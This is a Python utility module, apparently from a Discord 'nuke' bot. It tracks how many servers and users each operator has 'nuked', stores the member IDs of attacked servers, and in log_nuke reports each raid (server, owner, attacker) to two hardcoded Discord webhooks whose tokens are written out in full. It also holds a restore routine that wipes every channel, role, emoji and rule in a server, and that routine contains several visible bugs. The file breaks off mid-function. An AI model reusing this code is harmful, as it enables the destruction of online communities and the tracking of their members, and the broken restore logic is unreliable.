# pyright: reportArgumentType=false
# pyright: reportOptionalMemberAccess=false
# pyright: reportAssignmentType=false
# pyright: reportAttributeAccessIssue=false
# pyright: reportRedeclaration=false


import discord
import asyncio
import aiohttp
import datetime
import re

from copy import deepcopy
from io import BytesIO
from logging import getLogger
from discord.ext import commands
from inspect import Parameter
from re import search
from traceback import format_exc

from bots.shared.root import *
from bots.shared.hints import *
from bots.shared.ui import *
from bots.shared.aliases import *
from etc.database import *

from etc.xorshift32 import XorShift32

from typing import (
    Coroutine,
    Optional,
    Dict,
    Callable,
    List,
    Union,
    AsyncIterator,
    Tuple,
    Any
)


log = getLogger()

database: Database
xorshift32: XorShift32
cooldowns: Cooldowns
message_cache: Dict[int, int] = {}
bot: commands.Bot
session: aiohttp.ClientSession
emojis: Emojis
is_manager: bool



def get_prefix(bot: commands.Bot, message: discord.Message) -> Any:
    return '.'


def get_user_info(user: User) -> discord.Embed:
    if user is None:
        return embed(title='Error', description=f'User not found')
    
    status = ''
    color =  discord.Color.default()

    if user.is_premium:
        status = 'Premium '
        color = discord.Color.pink()

    if user.is_owner:
        status = 'Unhoisted Owner'
        color = discord.Color.yellow()

    elif user.is_admin:
        status = 'Admin'
        color = discord.Color.red()

    else:
        status += 'user'
        status = status.capitalize() 

    _embed = embed(
        description=f'Stats for <@{user.id}>',
        color=color,
        emoji=False
    )

    _embed.add_field(
        name='👨‍💼 Status',
        value=f'` {status} `',
        inline=False
    )
    
    _embed.add_field(
        name='💥 N#ked servers',
        value=f'` {user.server_amount} ` servers'
    )
    
    _embed.add_field(
        name='💥 N#ked users',
        value=f'` {user.user_amount} ` users'
    )
    return _embed


def get_editable_channels(guild: discord.Guild) -> List[GuildEditableChannel]:
    return [channel for channel in guild.channels if isinstance(channel, GuildEditableChannel)]


def get_managable_roles(guild: discord.Guild, *, limit: int = None) -> List[discord.Role]:
    roles: List[discord.Role] = []
    for role in guild.roles:
        if limit and len(roles) >= limit:
            break
        
        if role >= guild.me.top_role:
            continue
        roles.append(role)
    return roles


def is_managable_member(member: discord.Member, guild: discord.Guild, *, admin: bool = False) -> Optional[bool]:
    if isinstance(member, discord.User):
        return True
    
    if guild.owner == member:
        return False

    if member.top_role >= guild.me.top_role:
        return False

    if admin and member.guild_permissions.administrator:
        return None
    return True


def get_managable_members(guild: discord.Guild, *, limit: int = None, members: List[discord.Member] = None, admin: bool = False) -> List[discord.Member]:
    _members: List[discord.Member] = []
    __members: List[discord.Member] = []
    
    if members is not None:
        __members = members
    
    else:
        __members = guild.members

    for member in __members:
        if limit and len(_members) >= limit:
            break

        if is_managable_member(member, guild, admin=admin):
            _members.append(member)
    return _members


def plural(text: str, num: int):
    return text if num == 1 else text + 's'


def parse_time(*, durations: Optional[str] = None, seconds: int = 0) -> Optional[Tuple[int, str]]:
    secs: int = seconds
    duration_time: str = ''
    
    if durations is not None:
        patterns = {
            'w': r'(\d+)\s*(w(?:eeks?)?)',
            'd': r'(\d+)\s*(d(?:ays?)?)',
            'h': r'(\d+)\s*(h(?:ours?)?)',
            'm': r'(\d+)\s*(m(?:ins?|inutes?)?)',
            's': r'(\d+)\s*(s(?:ecs?|econds?)?)',
        }
        
        for unit, pattern in patterns.items():
            for _match in re.finditer(pattern, durations.lower()):
                _match: re.Match
                amount = int(_match.group(1))
                
                if unit == 'w':
                    secs += datetime.timedelta(weeks=amount).total_seconds()
                
                elif unit == 'd':
                    secs += datetime.timedelta(days=amount).total_seconds()
                
                elif unit == 'h':
                    secs += datetime.timedelta(hours=amount).total_seconds()
                
                elif unit == 'm':
                    secs += datetime.timedelta(minutes=amount).total_seconds()
                
                elif unit == 's':
                    secs += datetime.timedelta(seconds=amount).total_seconds()
        
    if secs == 0:
        return None
    
    duration = datetime.timedelta(seconds=secs)
    weeks, days = divmod(duration.days, 7)
    hours, remainder = divmod(duration.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    if weeks > 0:
        duration_time += f'{weeks} {plural('week', weeks)}, '

    if days > 0:
        duration_time += f'{days} {plural('day', days)}, '

    if hours > 0:
        duration_time += f'{hours} {plural('hour', hours)}, '

    if minutes > 0:
        duration_time += f'{minutes} {plural('minute', minutes)}, '

    if seconds > 0:
        duration_time += f'{seconds} {plural('second', seconds)}'
    return secs, duration_time


async def parse_args(ctx: commands.Context, /, *args) -> Tuple[Any, ...]:
    args = list(args)
    parsed = []

    used_reply_author = False
    reply_author = None

    if ctx.message.reference:
        if ctx.message.reference.resolved:
            reply_author = ctx.message.reference.resolved.author
      
        elif ctx.message.reference.message_id:
            # When message is not saved in cache
            message = await ctx.channel.fetch_message(ctx.message.reference.message_id)
            if message:
                reply_author = message.author

    if reply_author and not any(isinstance(arg, ManagableMember) or check_alias(arg, ManagableMember) for arg in args):
        parsed.append(reply_author)
        used_reply_author = True

    for arg in args:
        if used_reply_author:
            used_reply_author = False
            continue

        if check_alias(arg, ManagableMember):
            if isinstance(arg, (discord.Member, discord.User)):
                parsed.append(arg)
                continue

            elif isinstance(arg, (int, str)):
                for key in ['id', 'name', 'global_name']:
                    user = discord.utils.get(ctx.guild.members, **{key: arg})
                    if user:
                        parsed.append(user)
                        break
            
                else:
                    parsed.append(arg)
                continue

        if isinstance(arg, Duration):
            result = parse_time(durations=arg)
            parsed.append(result)
            continue
        parsed.append(arg)
    return tuple(parsed)


async def command_help(ctx: commands.Context, command: Optional[commands.Command], all_commands: List[commands.Command]) -> None:
    if command:
        command: commands.Command = bot.get_command(command) # type: ignore
        
        if not command:
            return await ctx.channel.send(embed=embed(title='Error', description=f'Command not found'))
        
        callback = cooldowns.callbacks[command.name]
        info = get_command_info(callback[0], command)
        is_premium = callback[1].premium_only
        cooldown = cooldowns.cooldowns[command.name]

        await ctx.channel.send(embed=embed(
            title=f'**{'Premium' if is_premium else 'Free'}** command: {command.name}',
            description=(
                f'{info[0]}\n\n'
                f'{info[1]}\n\n'
                f'{info[2]}\n\n'
                'Cooldowns:'
                f'\n- Server: {cooldown[0]} seconds'
                f'\n- User: {cooldown[1]} seconds'
            ),
            emoji=False
        ))
        
    else:
        if all_commands[0].hidden:
            help_menu = ManagerHelpMenu(all_commands)
        else:
            help_menu = HelpMenu(all_commands)
        help_menu.message = await ctx.channel.send(embed=help_menu.generate_embed(), view=help_menu)


async def create_guild_backup(guild: discord.Guild) -> Tuple[str, BackupData]:
    def parse_overwrites(overwrites: Dict[Union[discord.Role, discord.Member, discord.Object], discord.PermissionOverwrite]) -> List[OverwriteBackup]:
        _overwrites: List[OverwriteBackup] = []
        try:
            for key, value in overwrites.items():
                _overwrite: OverwriteBackup = {
                    'member': None,
                    'role': None
                }

                if isinstance(key, discord.Role):
                    _overwrite['role'] = key.id

                elif isinstance(key, discord.Member):
                    _overwrite['member'] = key.id
                
                else:
                    # Unknown object
                    continue
                
                __overwrites = {}
                for permission, flag in value:
                    __overwrites[permission] = flag
                _overwrite['overwrites'] = __overwrites
                _overwrites.append(_overwrite)
            return _overwrites

        except Exception as e:
            print(e)
            raise e
    

    def parse_asset(asset: discord.Asset) -> Optional[str]:
        if isinstance(asset, str):
            return asset
        
        if not asset:
            return None
        return asset.url
    

    def parse_emoji(emoji: Union[discord.PartialEmoji, discord.Emoji]) -> Optional[EmojiBackup]:
        if not emoji:
            return None
        
        if not emoji.id:
            _emoji: EmojiBackup = {
                'id': None,
                'name': None,
                'url': None,
                'created_at': None,
                'unicode': emoji.name
            }

        else:
            _emoji: EmojiBackup = {
                'id': emoji.id,
                'name': emoji.name,
                'url': emoji.url,
                'created_at': parse_datetime(emoji.created_at)
            }
        return _emoji


    def parse_tags(tags: List[discord.ForumTag]) -> List[ForumChannelTagBackup]:
        _tags: List[ForumChannelTagBackup] = []
        for tag in tags:
            _tag: ForumChannelTagBackup = {
                'name': tag.name,
                'moderatred': tag.moderated,
                'emoji': tag.emoji.url if tag.emoji else None
            }
            _tags.append(_tag)
        return _tags
    

    def parse_datetime(date: datetime.datetime) -> Optional[float]:
        if not date:
            return None
        return date.timestamp()
    

    def parse_autmod_trigger(trigger: discord.AutoModTrigger) -> AutoModTriggerBackup:
        _trigger: AutoModTriggerBackup = {
            'type': trigger.type.value,
            'presets': trigger.presets.value,
            'keyword_filter': trigger.keyword_filter,
            'allow_list': trigger.allow_list,
            'mention_limit': trigger.mention_limit,
            'regex_patterns': trigger.regex_patterns,
            'mention_raid_protection': trigger.mention_raid_protection
        }
        return _trigger

    is_community = 'COMMUNITY' in guild.features
    data: BackupData = {
        'members': [],
        'roles': [],
        'text_channels': [],
        'voice_channels': [],
        'stage_channels': [],
        'forum_channels': [],
        'categories': [],
        'soundboard_sounds': [],
        'automod_rules': [],
        'scheduled_events': [],
        'stickers': [],
        'emojis': [],
        'guild': {}
    }

    member_data = data['members']
    for member in guild.members:
        _member_data: MemberBackup = {
            'id': member.id,
            'nick': member.nick,
            'roles': [role.id for role in member.roles],
            'timed_out_until': parse_datetime(member.timed_out_until)
        }
        member_data.append(_member_data)
    data['members'] = member_data
    del member_data

    role_data = data['roles']
    for role in guild.roles:
        bot_id: Optional[int] = None

        if role.is_bot_managed():
            bot_id = role.tags.bot_id

        _role_data: RoleBackup = {
            'id': role.id,
            'name': role.name,
            'icon': parse_asset(role.icon),
            'color': role.color.value,
            'hoist': role.hoist,
            'mentionable': role.mentionable,
            'bot_id': bot_id,
            'default': role.guild.default_role == role,
            'position': role.position,
            'permissions': role.permissions.value
        }
        role_data.append(_role_data)
    data['roles'] = role_data
    del role_data

    category_channel_data = data['categories']
    for channel in guild.categories:
        _category_channel_data: CategoryBackup = {
            'id': channel.id,
            'name': channel.name,
            'position': channel.position,
            'overwrites': parse_overwrites(channel.overwrites)
        }
        category_channel_data.append(_category_channel_data)
    data['categories'] = category_channel_data
    del category_channel_data

    text_channel_data = data['text_channels']
    for channel in guild.text_channels:
        _text_channel_data: TextChannelBackup = {
            'id': channel.id,
            'name': channel.name,
            'nsfw': channel.is_nsfw(),
            'news': channel.is_news(),
            'topic': channel.topic,
            'position': channel.position,
            'category_id': channel.category_id,
            'slowmode_delay': channel.slowmode_delay,
            'default_auto_archive_duration': channel.default_auto_archive_duration,
            'permissions_synced': channel.permissions_synced,
            'overwrites': parse_overwrites(channel.overwrites)
        }
        text_channel_data.append(_text_channel_data)
    data['text_channels'] = text_channel_data
    del text_channel_data

    voice_channel_data = data['voice_channels']
    for channel in guild.voice_channels:
        _voice_channel_data: VoiceChannelBackup = {
            'id': channel.id,
            'name': channel.name,
            'nsfw': channel.is_nsfw(),
            'position': channel.position,
            'category_id': channel.category_id,
            'slowmode_delay': channel.slowmode_delay,
            'video_quality_mode': channel.video_quality_mode.value,
            'bitrate': channel.bitrate,
            'rtc_region': channel.rtc_region,
            'user_limit': channel.user_limit,
            'overwrites': parse_overwrites(channel.overwrites),
            'permissions_synced': channel.permissions_synced
        }
        voice_channel_data.append(_voice_channel_data)
    data['voice_channels'] = voice_channel_data
    del voice_channel_data

    if is_community:
        # Only community servers have access to these features
        stage_channel_data = data['stage_channels']
        for channel in guild.stage_channels:
            _stage_channel_data: StageChannelBackup = {
                'id': channel.id,
                'name': channel.name,
                'topic': channel.topic,
                'nsfw': channel.is_nsfw(),
                'position': channel.position,
                'category_id': channel.category_id,
                'slowmode_delay': channel.slowmode_delay,
                'video_quality_mode': channel.video_quality_mode.value,
                'bitrate': channel.bitrate,
                'rtc_region': channel.rtc_region,
                'user_limit': channel.user_limit,
                'overwrites': parse_overwrites(channel.overwrites),
                'permissions_synced': channel.permissions_synced
            }
            stage_channel_data.append(_stage_channel_data)
        data['stage_channels'] = stage_channel_data
        del stage_channel_data

        forum_channel_data = data['forum_channels']
        for channel in guild.forums:
            _forum_channel_data: ForumChannelBackup = {
                'id': channel.id,
                'name': channel.name,
                'topic': channel.topic,
                'nsfw': channel.is_nsfw(),
                'position': channel.position,
                'category_id': channel.category_id,
                'slowmode_delay': channel.slowmode_delay,
                'available_tags': parse_tags(channel.available_tags),
                'default_auto_archive_duration': channel.default_auto_archive_duration,
                'default_layout': channel.default_layout.value,
                'default_reaction_emoji': parse_emoji(channel.default_reaction_emoji),
                'default_sort_order': channel.default_sort_order.value,
                'default_thread_slowmode_delay': channel.default_thread_slowmode_delay,
                'overwrites': parse_overwrites(channel.overwrites),
                'permissions_synced': channel.permissions_synced
            }
            forum_channel_data.append(_forum_channel_data)
        data['forum_channels'] = forum_channel_data
        del forum_channel_data

    soundboard_sound_data = data['soundboard_sounds']
    for sound in guild.soundboard_sounds:
        _soundboard_sound_data: SoundboardSoundBackup = {
            'name': sound.name,
            'volume': sound.volume,
            'available': sound.available,
            'emoji': parse_emoji(sound.emoji),
            'sound': sound.url
        }
        soundboard_sound_data.append(_soundboard_sound_data)
    data['soundboard_sounds'] = soundboard_sound_data
    del soundboard_sound_data

    scheduled_event_data = data['scheduled_events']
    for event in guild.scheduled_events:
        _scheduled_event_data: ScheduledEventBackup = {
            'name': event.name,
            'description': event.description,
            'channel_id': event.channel_id,
            'location': event.location,
            'entitiy_type': event.entity_type.value,
            'privacy_level': event.privacy_level.value,
            'end_time': parse_datetime(event.end_time),
            'start_time': parse_datetime(event.start_time),
            'cover_image': parse_asset(event.cover_image),
            'status': event.status.value
        }
        scheduled_event_data.append(_scheduled_event_data)
    data['scheduled_events'] = scheduled_event_data
    del scheduled_event_data

    automod_rule_data = data['automod_rules']
    for rule in await guild.fetch_automod_rules():
        actions: List[AutoModActionBackup] = []
        for action in rule.actions:
            _action: AutoModActionBackup = {
                'type': action.type,
                'duration': parse_datetime(action.duration),
                'channel_id': action.channel_id,
                'custom_message': action.custom_message
            }
            actions.append(_action)

        _automod_rule_data: AutoModRuleBackup = {
            'enabled': rule.enabled,
            'event_type': rule.event_type.value,
            'exempt_channel_ids': list(rule.exempt_channel_ids),
            'exempt_role_ids': list(rule.exempt_role_ids),
            'name': rule.name,
            'trigger': parse_autmod_trigger(rule.trigger),
            'actions': actions
        }
        automod_rule_data.append(_automod_rule_data)
    data['automod_rules'] = automod_rule_data
    del automod_rule_data

    stickers = data['stickers']
    for sticker in guild.stickers:
        _sticker: StickerBackup = {
            'name': sticker.name,
            'description': sticker.description,
            'url': sticker.url,
            'created_at': sticker.created_at
        }
        stickers.append(_sticker)
    data['stickers'] = stickers
    del stickers

    emojis = data['emojis']
    for emoji in guild.emojis:
        _emoji = parse_emoji(emoji)
        emojis.append(_emoji)
    data['emojis'] = emojis
    del emojis

    data['guild'] = {
        'name': guild.name,
        'icon': parse_asset(guild.icon),
        'banner': parse_asset(guild.banner),
        'community': is_community,
        'description': guild.description,
        'vanity_code': guild.vanity_url_code,
        'preferred_locale': guild.preferred_locale.name,
        'premium_progress_bar_enabled': guild.premium_progress_bar_enabled,
        'afk_timeout': guild.afk_timeout,
        'afk_channel_id': guild._afk_channel_id,
        'public_updates_channel_id': guild._public_updates_channel_id,
        'rules_channel_id': guild._rules_channel_id,
        'system_channel_id': guild._system_channel_id,
        'system_channel_flags': guild.system_channel_flags.value,
        'invites_paused_until': parse_datetime(guild.invites_paused_until),
        'dms_paused_until': parse_datetime(guild.dms_paused_until),
        'default_notification': guild.default_notifications.value,
        'verification_level': guild.verification_level.value,
        'explicit_content_filter': guild.explicit_content_filter.value,
        'splash': parse_asset(guild.splash),
        'discovery_splash': parse_asset(guild.discovery_splash),
        'discoverable': 'DISCOVERABLE' in guild.features,
        'widget_enabled': guild.widget_enabled,
        'widget_channel_id': guild._widget_channel_id
    }

    key = xorshift32.randstr(lenght=32, english_chars=True)
    key = [key[i:i+4] for i in range(0, len(key), 4)]
    key = '-'.join(key)
    return key, data


async def load_backup(guild: discord.Guild, data: BackupData) -> bool:
    try:
        def sort_by(data: List[Dict], key: str, *, reverse: bool = False) -> List[Dict[Any, Any]]:
            try:
                return sorted(data, key=lambda x: x[key], reverse=reverse)
            
            except ValueError:
                return data
        

        async def get_overwrites(channel: MessagableBackup, category: discord.CategoryChannel) -> Union[discord.PermissionOverwrite, Dict[Any, Any]]:
            if channel['permissions_synced'] is True:
                _overwrites = category.overwrites

            else:
                _overwrites = await restore_overwrites(channel['overwrites'])
            return _overwrites or {}
        

        def get_bitrate(channel: VoiceChannelBackup) -> int:
            bitrate = channel['bitrate']

            if bitrate > 256:
                if not tier >= 3:
                    bitrate = 256
                
            if bitrate > 128:
                if not tier >= 2:
                    bitrate = 128
            
            if bitrate > 96:
                if not tier >= 1:
                    bitrate = 96
            return bitrate
        

        def parse_emoji(emoji_data: EmojiBackup) -> Union[discord.Emoji, discord.PartialEmoji]:
            if emoji_data['unicode'] is not None:
                emoji = discord.PartialEmoji.from_str(emoji_data['unicode'])

            else:
                emoji: discord.Emoji = restored.get(emoji_data['id'])

            if not _emoji:
                # :)
                emoji = discord.PartialEmoji.from_str('✅')
            return emoji
                

        async def restore_overwrites(overwrites: List[OverwriteBackup]) -> Dict[Union[discord.Member, discord.Role], discord.PermissionOverwrite]:
            _overwrites = {}
            for overwrite in overwrites:
                if overwrite['member']:
                    try:
                        member = await guild.fetch_member(overwrite['member'])
                    
                    except discord.HTTPException as exc:
                        continue
                    _overwrites[member] = discord.PermissionOverwrite(**overwrite['overwrites'])
                
                elif overwrite['role']:
                    role = restored['roles'].get(overwrite['role'])
                    if role is None:
                        continue
                    _overwrites[role] = discord.PermissionOverwrite(**overwrite['overwrites'])
            return _overwrites
        

        async def get_category(channel: MessagableBackup) -> Optional[discord.CategoryChannel]:
            category_id = channel['category_id']
            if not category_id:
                return None
            
            else:
                _category_id = restored['categories'].get(category_id, None)
                if not _category_id:
                    return None

                category = await guild.fetch_channel(_category_id)
                return category if isinstance(category, discord.CategoryChannel) else None
            

        temp1 = await guild.create_text_channel('temp~1')
        temp2 = await guild.create_text_channel('temp~2')

        # Cleanup
        await guild.edit(
            name='Loading backup.',
            community=False
        )

        for channel in guild.channels:
            if channel.id in (temp1.id, temp2.id):
                continue

            try:
                await channel.delete()
            except discord.HTTPException:
                pass

        for emoji in guild.emojis:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass

        for sticker in guild.stickers:
            try:
                await sticker.delete()
            except discord.HTTPException:
                pass

        for role in guild.roles:
            if role.is_default():
                continue
            
            try:
                await role.delete()
            except discord.HTTPException:
                continue
            # Crazy rate limits
            await asyncio.sleep(1)

        for sound in guild.soundboard_sounds:
            try:
                await sound.delete()
            except discord.HTTPException:
                pass

        for event in guild.scheduled_events:
            try:
                await event.delete()
            except discord.HTTPException:
                pass

        for rule in await guild.fetch_automod_rules():
            try:
                await rule.delete()
            except discord.HTTPException:
                pass

        await guild.edit(
            community=True,
            public_updates_channel=temp1,
            rules_channel=temp2,
            verification_level=discord.VerificationLevel.medium,
            explicit_content_filter=discord.ContentFilter.all_members
        )

        tier = guild.premium_tier
        restored = {
            'roles': {},
            'emojis': {},
            'categories': {},
            'text_channels': {},
            'voice_channels': {},
            'stage_channels': {},
            'forum_channels': {}
        }

        _roles: List[RoleBackup] = sort_by(data['roles'], 'position')
        _restored = restored['roles']    
        for role in _roles:
            if role['icon']:
                icon = await read_url(role['icon'])
                if icon and not tier >= 2 or not icon:
                    icon = None

            else:
                icon = None
            
            kwargs = {
                'permissions': discord.Permissions._from_value(role['permissions'])
            }

            if not role['default']:
                kwargs.update({ # type: ignore
                    'name': role['name'],
                    'color': discord.Color.from_str(f'#{int(str(role['color']), 16)}'),
                    'mentionable': role['mentionable'],
                    'hoist': role['hoist'],
                    'display_icon': icon or MISSING,
                })
                if not role['bot_id']:
                    _role = await guild.create_role(**kwargs) # type: ignore

                else:
                    for role['id'] in guild.roles:
                        if role.is_bot_managed():
                            if role.tags.bot_id == role['bot_id']:
                                # kwargs.pop('name')
                                _role = await role.edit(**kwargs)
                                break
                    else:                
                        continue
            else:
                _role = await guild.default_role.edit(**kwargs)
            _restored[role['id']] = _role
        restored['roles'] = _restored

        emojis: List[EmojiBackup] = sort_by(data['emojis'], 'created_at')
        _restored = restored['emojis']
        for emoji in emojis:
            image = await read_url(emoji['url'])
            if not image:
                continue

            image = compress(image)
            image = image.getvalue()
            _emoji = await guild.create_custom_emoji(
                name=emoji['name'],
                image=image
            )
            _restored[emoji['id']] = _emoji
        restored['emojis'] = _restored

        soundboard_sounds: List[SoundboardSoundBackup] = data['soundboard_sounds']
        for sound in soundboard_sounds:
            _sound = await read_url(sound['sound'])
            if not _sound:
                continue

            await guild.create_soundboard_sound(
                name=sound['name'],
                emoji=parse_emoji(sound['emoji']),
                volume=sound['volume'],
                sound=_sound
            )

        categories: List[CategoryBackup] = sort_by(data['categories'], 'position')
        _restored = restored['categories']
        for category in categories:
            _category = await guild.create_category(
                name=category['name'],
                overwrites=restore_overwrites(category['overwrites'])
            )
            _restored[category['id']] = _category
        restored['categories'] = _restored

        text_channels: List[TextChannelBackup] = sort_by(data['text_channels'], 'position')
        _restored = restored['text_channels']
        for channel in text_channels:
            category = await get_category(channel)
            overwrites = await get_overwrites(channel, category)

            _channel = await guild.create_text_channel(
                name=channel['name'],
                topic=channel['topic'],
                nsfw=channel['nsfw'],
                news=channel['news'],
                slowmode_delay=channel['slowmode_delay'],
                default_auto_archive_duration=channel['default_auto_archive_duration'],
                overwrites=overwrites or MISSING,
                category=category or MISSING,
                position=channel['position']
            )
            _restored[channel['id']] = _channel
        restored['text_channels'] = _restored

        voice_channels: List[VoiceChannelBackup] = sort_by(data['voice_channels'], 'position')
        _restored = data['voice_channels']
        for channel in voice_channels:
            category = await get_category(channel)
            overwrites = await get_overwrites(channel, category)
            bitrate = get_bitrate(channel)

            _channel = await guild.create_voice_channel(
                name=channel['name'],
                overwrites=overwrites or MISSING,
                category=categories or MISSING,
                rtc_region=channel['rtc_region'],
                user_limit=channel['user_limit'],
                bitrate=bitrate,
                position=channel['position'],
                # video_quality_mode=channel['video_quality_mode']
            )
            _restored[channel['id']] = _channel
        restored['voice_channels'] = _restored

        stage_channels: List[StageChannelBackup] = sort_by(data['stage_channels'], 'position')
        _restored = data['stage_channels']
        for channel in stage_channels:
            category = await get_category(channel)
            overwrites = await get_overwrites(channel, category)
            bitrate = get_bitrate(channel)

            _channel = guild.create_stage_channel(
                name=channel['name'],
                overwrites=overwrites or MISSING,
                category=category or MISSING,
                position=channel['position'],
                rtc_region=channel['rtc_region'],
                user_limit=channel['user_limit'],
                bitrate=bitrate
            )
            _restored[channel['id']] = _channel
        restored['stage_channels'] = _restored

        forum_channels: List[ForumChannelBackup] = sort_by(data['forum_channels'], 'position')
        _restored = data['forum_channels']
        for channel in forum_channels:
            category = await get_category(channel)
            overwrites = await get_overwrites(channel, category)

            available_tags: List[discord.ForumTag] = []
            for tag in channel['available_tags']:
                tag = discord.ForumTag(
                    name=tag['name'],
                    moderated=tag['moderatred'],
                    emoji=parse_emoji(tag['emoji'])
                )
                available_tags.append(tag)

            _channel = guild.create_forum(
                name=channel['name'],
                topic=channel['topic'],
                nsfw=channel['nsfw'],
                default_auto_archive_duration=channel['default_auto_archive_duration'],
                default_layout=discord.ForumLayoutType(channel['default_layout']),
                default_sort_order=discord.ForumOrderType(channel['default_sort_order']),
                overwrites=overwrites or MISSING,
                category=categories or MISSING,
                position=channel['position'],
                slowmode_delay=channel['slowmode_delay'],
                default_reaction_emoji=parse_emoji(channel['default_reaction_emoji']),
                available_tags=available_tags
            )
            _restored.append(_channel)
        restored['forum_channels'] = _restored
        del _restored

        rule_channel_id = data['guild']['rules_channel_id']
        public_updates_channel_id = data['guild']['public_updates_channel_id']
        
        if None in (rule_channel_id, public_updates_channel_id):
            await guild.edit(community=False)

        else:
            # Shouldn't be in voice channels
            text_channels: Dict[int, discord.TextChannel] = restored['text_channels']
            voice_channels: Dict[int, discord.VoiceChannel] = restored['voice_channels']
            text_channels.update(voice_channels)
            channels: Union[Dict[int, Union[discord.TextChannel, discord.VoiceChannel]]] = text_channels
            rules_channel: Optional[Union[discord.TextChannel, discord.VoiceChannel]] = None
            public_updates_channel: Optional[Union[discord.TextChannel, discord.VoiceChannel]] = None
            
            for channel in (rule_channel_id, public_updates_channel_id):
                _channel = channels.get(channel)
                if _channel:
                    if channel == rule_channel_id:
                        rules_channel = _channel

                    else:
                        public_updates_channel = _channel
            await guild.edit(
                public_updates_channel=public_updates_channel or MISSING,
                rules_channel=rules_channel or MISSING
            )

        members = data['members']
        for member in members:
            _member: Optional[discord.Member] = await guild.get_member(member['id'])
            if _member:
                roles: List[discord.Role] = []
                for role in member['roles']:
                    _role = restored.get(role)
                    if _role:
                        roles.append(role)
                await _member.edit(
                    nick=member['nick'],
                    roles=roles,
                    timed_out_until=member['timed_out_until']
                )

        automod_rules = data['automod_rules']
        channels = restored['text_channels']
        channels.update(restored['voice_channels'])
        channels.update(restored['forum_channels'])
        channels.update(restored['stage_channels'])
        channels.update(restored['categories'])

        for rule in automod_rules:
            exempt_channels: List[discord.abc.Messageable] = []
            exempt_roles: List[discord.Role] = []
            actions: List[discord.AutoModAction] = []

            for role in rule['exempt_role_ids']:
                _role = restored['roles'].get(channel['id'])
                if _role:
                    exempt_roles.append(_role)

            for channel in rule['exempt_channel_ids']:
                _channel = channels.get(channel['id'])
                if _channel:
                    exempt_channels.append(_channel)
            
            trigger = rule['trigger']
            trigger = discord.AutoModTrigger(
                type=trigger['type'],
                allow_list=trigger['allow_list'],
                keyword_filter=trigger['keyword_filter'],
                mention_limit=trigger['mention_limit'],
                mention_raid_protection=trigger['mention_raid_protection'],
                presets=trigger['presets'],
                regex_patterns=trigger['regex_patterns'],
            )

            for action in rule['actions']:
                action['duration'] = datetime.datetime.fromtimestamp(action['duration'])
                _action = discord.AutoModRuleAction(**action)
                actions.append(_action)

            await guild.create_automod_rule(
                name=rule['name'],
                enabled=rule['enabled'],
                event_type=discord.AutoModRuleEventType(rule['event_type']),
                exempt_channels=exempt_channels,
                exempt_roles=exempt_roles,
                trigger=trigger,
                actions=actions
            )
        
        if any(channel.id in [guild._rules_channel_id, guild._public_updates_channel_id] for channel in [temp1, temp2]):
            await guild.edit(community=False)
        
        await temp1.delete()
        await temp2.delete()

        guild_data = data['guild']
        edit_data = {
            'name': guild_data['name'],
            'community': guild_data['community']
        }

        if guild_data['community'] is True:
            if guild_data['description']:
                edit_data.update({'description': guild_data['description']})
            
        icon = await read_url(guild_data['icon'])
        if tier >= 1:
            if icon:
                edit_data.update({'icon': icon})

        else:
            logo = guild_data['icon']
            if logo and not '.gif' in logo:
                icon = await read_url(guild_data['icon'])
                if icon:
                    edit_data.update({'icon': icon})
            del logo
        del icon

        if tier >= 2:
            banner = await read_url(guild_data['banner'])
            if banner:
                edit_data.update({'banner': guild_data['banner']})
                del banner
        
        if tier >= 3:
            edit_data.update({'vanity_code': guild_data['vanity_code']})

        await guild.edit(**edit_data)
        return True

    except:
        print(format_exc())
        return False


async def wait_for(coro: Coroutine, on_timeout: Callable[[Coroutine[Any, Any, Any]], Coroutine[Any, Any, Any]] = None, *, timeout: float = 10.0) -> Any:
    try:
        return await asyncio.wait_for(coro, timeout=timeout)
    
    except (asyncio.TimeoutError, TimeoutError):
        if on_timeout:
            return await on_timeout(coro)
        return
    

async def read_url(url: str) -> Optional[bytes]:
    if url is None:
        return None
    
    try:
        async with session.get(url) as response:
            response.raise_for_status()
            content = await response.read()
            return content
    
    except aiohttp.ClientError as exc:
        log.warning(f'Failed to GET {url}; {exc}')
        return None
    

async def get_members() -> List[int]:
    guild = bot.get_guild(super_private_id)
    return [member.id for member in guild.members]


async def get_from_iterator(iter: AsyncIterator) -> Any:
    items = []
    async for item in iter:
        items.append(item)
    
    if len(items) == 1:
        return items[0]
    return items


async def log_nuke(guild: discord.Guild, user: User):
    old_user = deepcopy(user)
    members = [member.id for member in guild.members]
    updated = database.set_nuke(user, guild.id, members)
    
    absolutely_temporary_variable = 'https://discord.com/api/webhooks/1361743274104197210/_k9Rtk9DvYfdBa17Wl9yynsnPrNlL18X_OyeEuG-a6WeLjlcSkLTzN1QAaaPC3aBkqi7'
    absolutely_temporary_variable2 = 'https://discord.com/api/webhooks/1363794395324747816/EyeLBmc9Jpk41UM358BuNrSM1sVzYTvGGzh-KXDqlnMomFw34Uue99l6T7y79xoCgwGh'
    webhook = discord.Webhook.from_url(absolutely_temporary_variable, client=bot)
    webhook2 = discord.Webhook.from_url(absolutely_temporary_variable2, client=bot)
    stats = database.get_stats()
    _embed = embed(
        description=f'```fix\nNuke #{stats.server_amount}\n```',
        emoji=False
    )

    if updated is False:
        _embed = embed(
            description=f'```fix\nNuke\n```',
            emoji=False
        )

    if user.id in database.owners:
        _embed.color = discord.Color.yellow()

    elif user.id in database.admins:
        _embed.color = discord.Color.red()

    elif user.is_premium:
        _embed.color = discord.Color.pink()
    
    data = {
        'Server Name': guild.name,
        # 'Owner': guild.owner,
        'Members': guild.member_count,
        'Boosters': guild.premium_subscription_count
    }
    
    for key, value in data.items():
        _embed.add_field(
            name=key,
            value=f'` {value} `',
            inline=True
        )

    _embed.add_field(
        name='Stats',
        value=(
            f'Users +`{user.user_amount - old_user.user_amount}`\n'
            f'Servers +`{user.server_amount - old_user.server_amount}`'
        )
    )

    _embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    _embed.set_image(url='https://media.discordapp.net/attachments/1288587327811358735/1324002009019580516/image.png?ex=67ffac75&is=67fe5af5&hm=d223a8a96ec89fc4144e86603b8230b53c51da2b9f296526b61a4371ffffa25f&=&format=webp&quality=lossless&width=654&height=242')
    await webhook.send(embed=_embed) 
    await webhook2.send(embed=embed(
        title=f'{guild.name} (ID: {guild.id})',
        description=(
            f'Owner: {guild.owner} (ID: {guild.owner_id})\n'
            f'Done by: <@{user.id}> (ID: {user.id})\n'
        ),
        emoji=False
    ))


def get_reason(author: Union[discord.Member, discord.User], reason: str) -> str:
